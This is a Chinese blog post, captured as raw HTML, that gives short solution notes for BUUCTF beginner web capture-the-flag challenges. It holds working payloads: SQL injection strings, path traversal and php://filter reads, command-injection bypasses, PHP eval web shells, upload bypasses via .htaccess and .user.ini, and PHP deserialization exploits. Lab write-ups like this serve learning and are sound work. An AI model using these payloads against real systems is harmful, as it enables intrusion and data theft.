@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />            
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <title>BUUCTF WEB入门题小记 - imiab - 博客园</title>
+    
+    <meta name="description" content="[极客大挑战 2019]EasySQL 使用 1&amp;#39; or &amp;#39;1&amp;#39; = &amp;#39;1&amp;#39; #绕过sql 注意sql中的等于是=，不等于是&amp;lt;&amp;gt;或!= [极客大挑战 2019]Havefun 在源代码中的注释中找到提示 用$cat=dog获得flag [HCTF " />    
+    <meta property="og:description" content="[极客大挑战 2019]EasySQL 使用 1&amp;#39; or &amp;#39;1&amp;#39; = &amp;#39;1&amp;#39; #绕过sql 注意sql中的等于是=，不等于是&amp;lt;&amp;gt;或!= [极客大挑战 2019]Havefun 在源代码中的注释中找到提示 用$cat=dog获得flag [HCTF " />
+    <meta property="og:image" content="https://assets.cnblogs.com/images/wechat-share.jpg" />
+    <meta property="bytedance:published_time" content="2025-05-13T23:05:33+08:00" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=6O_Ku8w_jYd3yw2BX9ElmxGv25AYbAQ-F6ZeOeZfxYc" />
+    
+    <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="/css/hljs/cnblogs.css?v=5J1NDtbnnIr2Rc2SdhEMlMxD4l9Eydj88B31E7_NhS4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/undefined/custom.css?v=M8To7qEiClk5j8&#x2B;gr6sf&#x2B;xNi&#x2B;ok=" />
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/css/mobile-common.min.css?v=a5tjm35tHR3Bq88JZf8V-jiXDhgs5wg823qWgRI6uRY" />
+    
+    <link id="favicon" rel="icon" type="image/x-icon" sizes="32x32" href="https://assets.cnblogs.com/favicon_v3_3.ico" />
+    <link id="favicon_svg" rel="icon" type="image/svg+xml" href="https://assets.cnblogs.com/favicon_v3_3.svg" />
+    <link rel="apple-touch-icon" href="https://assets.cnblogs.com/apple-touch-icon.png?v=2" />
+    <link rel="canonical" href="https://www.cnblogs.com/undefined/p/18875060" />
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/undefined/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/undefined/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/undefined/wlwmanifest.xml" />
+    
+    <script type="application/ld&#x2B;json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BlogPosting",
+      "@id": "https://www.cnblogs.com/undefined/p/18875060",
+      "headline": "BUUCTF WEB入门题小记",
+      "description": "[极客大挑战 2019]EasySQL 使用 1\u0026#39; or \u0026#39;1\u0026#39; = \u0026#39;1\u0026#39; #绕过sql 注意sql中的等于是=，不等于是\u0026lt;\u0026gt;或!= [极客大挑战 2019]Havefun 在源代码中的注释中找到提示 用$cat=dog获得flag [HCTF 2018]WarmUp 在源代码中的注释找到提示 进",
+      "image": [
+        
+      ],
+      "author": {
+        "@type": "Person",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "imiab",
+        "url": "https://www.cnblogs.com/undefined/"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://www.cnblogs.com/",
+        "name": "博客园",
+        "url": "https://www.cnblogs.com/"
+      },
+      "datePublished": "2025-05-13T23:06:00.0000000&#x2B;08:00",
+      "dateModified": "2025-05-13T23:06:00.0000000&#x2B;08:00",
+      "wordCount": "7458",
+      "isPartOf": {
+        "@type": "Blog",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "undefined",
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://www.cnblogs.com/",
+          "name": "博客园"
+        }
+      }
+    }
+    </script>
+
+    <script>
+        var currentBlogId = 841504;
+        var currentBlogApp = 'undefined';
+        var isLogined = false;
+        var isBlogOwner = false;
+        window.isCorp = false;
+        window.skinName = 'Custom';
+        var visitorUserId = '';
+        window.hasCustomScript = true;
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 1;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false;        
+    </script>
+        <script>
+            window.currentPostId = 18875060;
+            window.currentPostDateAdded = '2025-05-13 23:06';
+        </script>
+    <script src="https://assets.cnblogs.com/scripts/jquery-3.3.1.min.js"></script>
+    <script src="https://cdn-www.cnblogs.com/js/blog-common.min.js?v=q6A5rdB3tiIeY5Vi562gBAr3OVg5t0HcQVXePY_F0qU"></script>
+        <script>updateCustomBlogReferrer();</script>
+    
+</head>
+<body class="skin-custom has-navbar">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="//assets.cnblogs.com/logo.svg" alt="博客园logo" />
+                    </a>
+                </li>
+                <li><a href="https://cnblogs.vip/">会员</a></li>
+                <li><a href="https://cnblogs.vip/store">周边</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a></li>                
+                <li><a href="https://www.cnblogs.com/cmt/p/19316348">赞助商</a></li>
+                <li><a href="https://chat2db-ai.com/" target="_blank">Chat2DB</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off" />
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                            <img class="hidden focus-visible" src="//assets.cnblogs.com/icons/enter.svg" alt="搜索" />
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById('zzk_search_input').value)">
+                                <div class="keyword-wrapper">
+                                    <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, 'undefined', document.getElementById('zzk_search_input').value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://www.cnblogs.com/my" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/message.svg" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="//assets.cnblogs.com/icons/lite-mode-on.svg" alt="简洁模式" />
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="//assets.cnblogs.com/icons/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://www.cnblogs.com/my">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="https://vip.cnblogs.com/my">会员中心</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <div id="loading"><div class="loader-inner"></div></div>
+    </div>
+
+    <div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/undefined/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/undefined">undefined</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div>
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/undefined/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/imiab">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/undefined/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div>
+	</div>
+</div>
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/undefined/p/18875060" title="发布于 2025-05-13 23:05">
+    
+
+    <span role="heading" aria-level="2">BUUCTF WEB入门题小记</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL</h1>
+<p>使用<code> 1' or '1' = '1' #</code>绕过sql</p>
+<p>注意sql中的等于是=，不等于是&lt;&gt;或!=</p>
+<h1 id="极客大挑战-2019havefun">[极客大挑战 2019]Havefun</h1>
+<p>在源代码中的注释中找到提示</p>
+<p>用$cat=dog获得flag</p>
+<h1 id="hctf-2018warmup">[HCTF 2018]WarmUp</h1>
+<p>在源代码中的注释找到提示</p>
+<p>进入source.php，审计代码后</p>
+<p>用file=hint.php?../../../../ffflllaaaggg获得flag</p>
+<h1 id="actf2020-新生赛include">[ACTF2020 新生赛]Include</h1>
+<p>"php://" 伪协议的条件：</p>
+<ul>
+<li>allow_url_fopen:off/on。</li>
+<li>allow_url_include:off/on（php://input、php://stdin、php://memory、php://temp 伪协议需要 on）。</li>
+</ul>
+<p>这里着重介绍以下 "php://" 伪协议中的 "php://filter"伪协议。</p>
+<p>php://filter 是 PHP 中的一种特殊的伪协议，它允许对数据进行过滤处理。它可以通过输入流或输出流来操作数据，常用于对文件、数据流等进行编码、解码、压缩等处理。</p>
+<p>主要用途：</p>
+<p>对文件内容进行转换，如 base64 编码、ROT13 加密、字符串大小写转换等。<br>
+对 HTTP 请求的输入或输出流进行过滤。<br>
+基本的语法：</p>
+<ul>
+<li>php://filter/read=&lt;过滤器列表&gt;/resource=&lt;操作目标&gt;</li>
+</ul>
+<p>之类的东西，然后就可以将php当作文本打开并输出，并从其中的注释获得flag</p>
+<p>/?file=php://filter/convert.iconv.utf8.utf16/resource=flag.php</p>
+<p>比如这样↑</p>
+<h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h1>
+<p>空格绕过的几种方式：&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等。</p>
+<p>反引号``会被优先执行，并被重新加载到指令里继续执行</p>
+<p>如果用<code>ls</code>需要到f12里找flag</p>
+<h1 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h1>
+<p>没有过滤;</p>
+<p>配合show databases和show tables堆叠注入可以泄露信息</p>
+<p>可以用字典+bp看哪些关键字被过滤</p>
+<p>看别人wp发现使用*,1或者修改一个mode可以获得flag</p>
+<p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<p>就是把 || 设置成了 concat函数</p>
+<p>后端代码$sql = "select ".$post['query']."||flag from Flag";</p>
+<p>上面那句执行是：</p>
+<p>select concat(1,flag) from Flag</p>
+<h1 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h1>
+<p>1' union select 1,schema_name FROM information_schema.schemata #</p>
+<p>通过特殊表<code>information_schema</code>（储存有关数据库信息的表）查询更多信息</p>
+<p>相关连接：<a href="https://www.cnblogs.com/Chary/p/17940824" target="_blank">https://www.cnblogs.com/Chary/p/17940824</a></p>
+<p>database() schema() current_schema() 返回当前的数据库名字</p>
+<p>构造联合注入获得flag</p>
+<pre><code>1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database();# 
+# group_concat()可以将查询到的所有字段名连接在一块
+1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#
+# 最后查询表内数据
+1' union select 1,2,group_concat(username,'~',password) from l0ve1ysq1
+</code></pre>
+<h1 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h1>
+<p>用bp抓包，一路跟到secret</p>
+<p>secret里面有个file读，并提示flag在flag.php里</p>
+<p>用php://filter/convert.iconv.utf8.utf16/resource=flag.php获得flag</p>
+<h1 id="强网杯-2019随便注">[强网杯 2019]随便注</h1>
+<p>1, union selec/**/t schema_name from information.schemata#</p>
+<p>发现.被过滤，但是没有过滤;</p>
+<p>用堆叠注入</p>
+<p>1';show tables;#</p>
+<p>1';show columns from <code>1919810931114514</code>;#</p>
+<p>注意这里是反引号而不是单引号，因为其中内容是数字而非字符串</p>
+<p>1' and extractvalue(0x0a,concat(0x0a,(database())))</p>
+<p>extractvalue是mysql的处理函数，作用是从xml字符串中提取符合XPath的值</p>
+<p>在这里我们传入错误的xml字符串，mysql就会报错把database全部返回给我们（有详细错误输出的情况下）</p>
+<p>发现不是mysql，是supersqli</p>
+<p>1';SET @a=concat("sel","ect flag from <code>1919810931114514</code>");PREPARE hello from @a;execute hello;#</p>
+<p>利用set @a加上concat字符拼接的形式，成功绕过并输出flag</p>
+<p>或者用rename重命名也可以</p>
+<p>';alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p>
+<h1 id="极客大挑战-2019http">[极客大挑战 2019]Http</h1>
+<p>dirsearch扫了个login出来，没什么用</p>
+<pre><code class="language-html">&lt;a style="border:none;cursor:default;" onclick="return false" href="Secret.php"&gt;氛围&lt;/a&gt;
+</code></pre>
+<p>在这里有一个神秘php，onclick永远false，且cursor为default，光标不会变手，且border为none没有边框</p>
+<p>所以就是被藏起来的东西，点进去以后根据要求</p>
+<p>逐步修改X-Forward-For、user-agent和referer，然后即可获得flag</p>
+<h1 id="极客大挑战-2019upload">[极客大挑战 2019]Upload</h1>
+<p>用phtml绕过后缀名php检测</p>
+<p>用GIFa89?绕过magic检测</p>
+<p>还要修改type，然后就过了</p>
+<pre><code class="language-html">&lt;script language='php'&gt;
+eval($_GET["cmd"]);
+&lt;/script&gt;
+</code></pre>
+<h1 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h1>
+<p>一句话，没了</p>
+<h1 id="actf2020-新生赛upload">[ACTF2020 新生赛]Upload</h1>
+<p>phtml，没了</p>
+<h1 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h1>
+<p>SQL巩固</p>
+<p>注意两个注释后面都要加空格</p>
+<p>快速默写一下</p>
+<p>1' union select 1,2,group_cat(schema_name) from information_schema.schemata --</p>
+<p>1' union select 1,2,group_cat(table_name) from information_schema.tables where table_schema = database()</p>
+<p>1' union select 1,2,group_cat(column_name) from information_schema.columns where table_schema = database() and table_name = "xxx" --</p>
+<p>union和select被数删了，双写绕过即可</p>
+<p>（实际上里面插or就行了，这样短一些）</p>
+<h1 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h1>
+<p>dirsearch -x 429即可排除429正常扫描</p>
+<p>哦不还是用dirmap吧，新版dirsearch貌似硬编码禁止429</p>
+<p>然后分析flag.php和index.php，构造出满足条件的就可以了</p>
+<pre><code class="language-php">&lt;?php
+class Name{
+    private $username = "admin";
+    private $password = 100;
+}
+$a = new Name;
+echo urlencode(serialize($a)) . "\n";
+echo serialize($a);
+?&gt;
+#O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
+</code></pre>
+<p>这里利用了一个Obj数不相等就会跳过wakeup的漏洞（CVE-2016-7124</p>
+<p>发生版本php5&lt;5.6.25 php7&lt;7.0.10</p>
+<p>name后面那个改成3即可</p>
+<h1 id="actf2020-新生赛-backupfile">[ACTF2020 新生赛] BackupFile</h1>
+<p>用dirmap扫，dirsearch一片绿，还要自己翻</p>
+<p>dirmap第一遍没扫出来，第二遍扫出来了</p>
+<p>查看bak，弱类型比较，输入?key=123结束</p>
+<h1 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h1>
+<p>进入calc.php，获得源码</p>
+<p>然后不会，说?num这里问号后面加空格就绕waf了</p>
+<p>？？？</p>
+<p>总之绕了，虽然有些过滤但是chr.chr拼一下结束了</p>
+<p>file_get_contents读文件</p>
+<p>var_dump打印对象键值对</p>
+<p>chr().chr()用数字拼字符</p>
+<h1 id="极客大挑战-2019buyflag">[极客大挑战 2019]BuyFlag</h1>
+<p>可恶啊bp以为加了内容就是post了，结果请求头get忘改害我排查了好久</p>
+<p>"404a"=404</p>
+<p>cookie里面改成1（诡异的考点）</p>
+<p>money进行了长度过滤，不能直接输入</p>
+<p>1e9或者money[]=1000000000都可以，前者长度够短，后者能通过长度过滤，比较中再转化为字符串比较，简单通过</p>
+<h1 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h1>
+<p>第一关，只要碰撞出一个开头为1'or'加上一个非0数字即可</p>
+<p>第二关，只要碰撞出两个0e开头的md5即可</p>
+<p>AI直接给了我一个然后做完了?a=QNKCDZO&amp;b=240610708</p>
+<p>第三关，传两个数组结束</p>
+<h1 id="hctf-2018admin">[HCTF 2018]admin</h1>
+<p>源码404了怎么写？</p>
+<p>但是提供了两个思路，第一个是能拿到源码，能拿到secret key，就可以伪造sessions</p>
+<p>第二个思路是unicode字符转码，用ᴬ -&gt; A -&gt; a，导致admin被覆盖</p>
+<h1 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h1>
+<p>修改content-type就可以上传</p>
+<p>传.htaccess将jpg视作php</p>
+<pre><code>AddType application/x-httpd-php .jpg
+
+# 或者
+
+&lt;FilesMatch "lx1"&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre>
+<p>如果禁用图片可以用xdm绕过，刚好文件头是两个#被当成注释</p>
+<p>一句话禁了system，用scandir和var_dump和file_get_contents输出flag即可</p>
+<h1 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado</h1>
+<p>tornado render漏洞</p>
+<p>error message输入{{20}}发现大括号没了</p>
+<p>虽然乘法被过滤了，但是{{handler.settings}}泄露secret cookie随后用hints的办法+hash成功秒杀</p>
+<h1 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h1>
+<p>简单反序列化</p>
+<p>可以用伪协议假装输入是来自文件，用?text=data://text/plain,welcome to the zjctf</p>
+<p>exp:</p>
+<pre><code class="language-php">&lt;?php  
+class Flag{  //flag.php  
+    public $file;  
+}  
+
+$a = new Flag();
+$a-&gt;file = "/flag.php";
+echo serialize($a);
+//O:4:"Flag":1:{s:4:"file";s:9:"/flag.php";}
+</code></pre>
+<h1 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</h1>
+<p>简单bypass，依旧是传两个数组加弱比较</p>
+<h1 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h1>
+<p>报错注入：1'or(extractvalue(0x0a,concat(0x0a,(database()))))#</p>
+<p>()也可以用来当空格用</p>
+<p>1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))#</p>
+<p>1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())))))#</p>
+<p>1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(id,username,password))from(H4rDsq1)))))#</p>
+<p>1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(right(password,25)))from(H4rDsq1)))))#</p>
+<p>前两个分别是爆表名和列名，后两个是把flag读出来，因为这个函数报错长度有限制要拆成两部分</p>
+<p>H4rDsq1</p>
+<p>flag{1ef882da-6f02-4bd3-84<br>
+2-4bd3-8406-529a271a3eb3}</p>
+<p>flag{1ef882da-6f02-4bd3-8406-529a271a3eb3}</p>
+<h1 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h1>
+<p>简单类型判断绕过get flag</p>
+<p>写那么长还以为有多难呢</p>
+<h1 id="gxyctf2019babyupload">[GXYCTF2019]BabyUpload</h1>
+<p>考点开始重复了喵，简单upload即可</p>
+<p>用<code>&lt;script language='php'&gt;@eval($_GET['a'])&lt;/script&gt;</code>即可</p>
+<h1 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h1>
+<p>不能.htaccess那就.user.ini</p>
+<p>GIF89a<br>
+auto_prepend_file=1.jpg</p>
+<p>然后1.jpg传马，访问那个目录下的index.php即可</p>
+<h1 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli</h1>
+<p>union select的时候如果传入伪造的数据</p>
+<p>会把伪造的数据也列入查询结果</p>
+<p>伪造union select 1,'admin',md5('123')然后password=123就可以了</p>
+<p>那个union确实能想出来，但是md5就有点奇怪了，看别人wp才知道，不过也算常见就是了\\</p>
+<h1 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h1>
+<p>堆叠注入，学习一下低级方式handler的用法</p>
+<p>1';handler FlagHere open;handler FlagHere read next; handler FlagHere close; #</p>
+<h1 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java</h1>
+<p>抄一下别人博客里的东西</p>
+<p>说起来能不能用dirmap（试了好像不能</p>
+<pre><code>src/main/java: 这个目录一般是存放web项目的Java源文件的
+src/main/resource: 这个目录一般是存放相关的配置文件
+src/main/webapp: 这个目录一般是和web应用相关的
+webapp下的文件目录是容易出现安全问题的
+/WEB-INF/web.xml: Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则
+/WEB-INF/classes/：含了站点所有用的 class 文件(即编译后的Java文件)，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+/WEB-INF/database.properties：数据库配置文件
+</code></pre>
+<p>发现有个help.docx，但是无法下载，改成post以后能下了</p>
+<p>然后下web.xml，里面有个flagcontroller，再跟着下就把flag下出来了</p>
+<p>不知道为什么，浏览器不准我下，于是用burp直接看返回包，获得flag</p>
+<p>至此buuctf web第一页结束！大概思路精简如上，啪唧啪唧啪唧</p>
+<p>（虽然好多时候都在看别人的blog，但也算，稍微，稍微入了一点点门吧？比如说xss什么都还没写到.jpg）</p>
+<p>（但是我还没有配自己的服务器，看来还要加吧劲了.jpg）</p>
+<p>（因为内核学太累了所以摸两天，呜呜小花不要骂我）</p>
+
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo" class="post-meta-container">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2025-05-13 23:06">2025-05-13 23:05</span>&nbsp;
+<a href="https://www.cnblogs.com/undefined">imiab</a>&nbsp;
+阅读(<span id="post_view_count">299</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(18875060);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fundefined%2Fp%2F18875060&targetId=18875060&targetType=0" target="_blank">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script>
+    var cb_entryId = 18875060, cb_entryCreatedDate = '2025-05-13 23:05', cb_postType = 1, cb_postTitle = 'BUUCTF WEB入门题小记';
+    var allowComments = true, cb_blogId = 841504, cb_blogApp = 'undefined', cb_blogUserGuid = '8a0895b2-d2a5-4d98-c91d-08dd08913576';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");    
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav">
+        <div class="comment-nav-right">
+            <span id="span_refresh_tips"></span><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a>
+        </div>
+    </div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+        <div id="blog_c1" class="under-post-card below-post-card">
+            <a href="https://www.doubao.com/download/desktop?ug_apk_token=FxCjd" rel="nofollow" target="_blank" onclick="countCreativeClicks('C1-字节-豆包')">
+                <img src="https://img2024.cnblogs.com/blog/35695/202609/35695-20260905201441417-1701437871.webp" onload="countCreativeImpressions('C1-字节-豆包')" alt="" style="width:300px!important;height:250px!important;min-width:300px!important;max-width:300px!important;" />
+                <span id="c1_impression" style="display:none"></span>
+            </a>
+        </div>
+    <div id="under_post_card1"></div>
+    <div id="related_posts_card"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card below-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+            setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+            LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div>
+	</div>
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+					<script>loadBlogSideColumn()</script>
+			</div>			
+		</div>
+	</div>
+	<div class="clear"></div>
+	</div>
+	<div class="clear"></div>
+	<div id="footer">
+		<a href="https://www.cnblogs.com/" id="footer_site_link" class="footer-brand">博客园</a>
+<span class="footer-copyright"> &nbsp;&copy;&nbsp; 2004-2026</span>
+<br /><span class="footer-icp">
+    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771"><img src="//assets.cnblogs.com/images/ghs.png" />浙公网安备 33010602011771号</a>
+    <a href="https://beian.miit.gov.cn" target="_blank">浙ICP备2021040463号-3</a>
+</span>
+
+
+
+	</div>
+</div>
+
+
+
+    <div id="page_end_html">
+        <script src="https://cdn.cnblogs.com/awescnb/index.js"></script>
+<script>
+  const opts = {
+    bodyBackground: {
+        enable: true,
